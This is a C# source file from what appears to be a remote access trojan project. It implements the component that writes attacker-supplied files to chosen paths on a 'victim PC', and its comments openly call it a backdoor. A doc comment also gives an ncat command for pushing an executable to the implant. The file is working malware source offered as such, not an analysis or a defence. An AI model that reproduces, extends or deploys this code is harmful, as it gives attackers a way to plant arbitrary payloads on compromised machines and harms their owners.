using RAT.Interfaces;
using RAT.Models;
using RAT.Models.Enums;
using System;
using System.IO;

namespace RAT.Logic.RatCommands.Features
{
    /// <summary>
    /// File upload feature for rat/backdoor (to victim PC).
    /// </summary>
    public class FileUploader : IFileUploader
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IClientNotificationLogic _clientNotificationLogic;

        /// <summary>
        /// File upload feature for rat/backdoor (to victim PC).
        /// </summary>
        /// <param name="stateLogic">Our client/socket current state.</param>
        /// <param name="notificationLogic">Logic for sending notifications to client.</param>
        public FileUploader(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic)
        {
            _socketStateLogic = stateLogic;
            _clientNotificationLogic = notificationLogic;
        }

        /// <summary>
        /// Does preparations for file upload, goes into listening state and waits for the data.
        /// </summary>
        /// <param name="path">Path on which file will be uploaded.</param>
        /// <param name="fileSize">Size of file that will be uploaded.</param>
        public void PrepareForFileUpload(string path, int fileSize)
        {
            _socketStateLogic.State.FileUploadInformation = new FileUploadInformation()
            {
                FileDataArray = new byte[fileSize],
                PathForFileUpload = path,
                FileUploadProgress = FileUploadProgress.Begins,
            };

            _clientNotificationLogic.NotifyClient($"\nReady for file upload on path \"{path}\"\n");
        }

        /// <summary>
        /// Uploads file data to specified path. /// ncat <ip> <port> --send-only < someapp.exe
        /// </summary>
        /// <param name="path">Path to file that should be created with data.</param>
        /// <param name="data">Data that should be written to created file.</param>
        public void UploadFile(string path, byte[] data)
        {
            try
            {
                using (var fileStream = File.Create(path))
                {
                    fileStream.Write(data, 0, data.Length);
                }
            }
            catch (Exception exception)
            {
                _clientNotificationLogic.NotifyClient($"\nError during file upload {exception.Message}\n");
                return;
            }

            _clientNotificationLogic.NotifyClient($"\nFile on path \"{path}\" uploaded successfully\n");
        }
    }
}